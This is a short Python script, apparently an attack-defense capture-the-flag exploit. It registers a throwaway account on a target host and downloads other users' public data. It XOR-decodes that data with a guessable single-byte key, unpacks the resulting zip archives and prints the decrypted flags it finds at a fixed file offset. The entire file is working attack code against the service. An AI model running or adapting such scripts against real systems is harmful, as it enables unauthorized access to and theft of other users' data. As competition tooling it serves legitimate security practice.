#!/usr/bin/env python3

import api
import sys

ZIP_FILE = "./pack.zip"
DATA_LIMIT = 50
KEY = 0x77 # May be brute force 255 times
OFFSET = 0x870

def connect(host):
    try:
        r = api.connect(host)
        return r
    except Exception as e:
        print("Connect error")
        exit()

def parse_data(data):
    dec_data = bytearray()
    for c in api.b64_decode(data):
        dec_data.append(c ^ KEY)

    if dec_data[0:2].decode() != "PK":
        return

    zip_file = open(ZIP_FILE, "wb")
    zip_file.write(dec_data)
    zip_file.close()

    with api.ZipFile(ZIP_FILE, 'r') as zip_ref:
        zip_ref.extractall(".")

    fd = open("./file", "rb")
    fd.seek(OFFSET)
    encrypt_flag = fd.read(32).decode()
    fd.close()

    print(api.decrypt_flag(encrypt_flag))

host = sys.argv[1]
name = api.get_rand_str(12)
password = api.get_rand_str(16)

r = connect(host)

api.reg_auth(r, name, password)
public_data = api.get_public_data(r).decode().split('\x00')
api.logout_exit(r)

data_count = 0
for data in public_data[::-1]:
    if data_count >= DATA_LIMIT:
        exit()

    if len(data) > 100:
        data_count += 1;
        parse_data(data)
